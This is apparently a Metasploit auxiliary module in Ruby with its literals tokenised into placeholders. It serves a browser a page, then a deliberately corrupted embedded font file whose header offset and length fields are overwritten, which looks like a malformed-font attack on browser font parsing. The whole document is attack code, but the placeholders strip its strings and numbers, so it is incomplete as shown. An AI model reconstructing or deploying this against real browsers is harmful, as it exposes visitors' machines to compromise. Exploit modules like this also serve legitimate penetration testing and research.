require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ OptPath . new ( <str> , [ true , <str> , File . join ( Msf :: Config . data_directory , <str> , <str> ) ] ) , ] , self . class ) end def run exploit end def on_request_uri ( cli , request ) @tag || = Rex :: Text . rand_text_alpha ( <int> ) @eot || = :: File . read ( datastore [ <str> ] , :: File . size ( datastore [ <str> ] ) ) if ( request . uri =~ <str> @tag <str> ) content = @eot . dup cidx = content . index ( <str> ) coff = <hex> clen = ( <hex> - coff + <hex> ) content [ cidx + <int> , <int> ] = [ coff , clen ] . pack ( <str> ) print_status ( <str> ) send_response_html ( cli , content , { <str> = > <str> } ) else var_title = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) var_body = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) var_font = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) var_face = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) content = <str> var_title <str> var_face <str> get_resource <str> var_font <str> @tag <str> var_face <str> var_body <str> print_status ( <str> ) send_response_html ( cli , content , { <str> = > <str> } ) end end end 
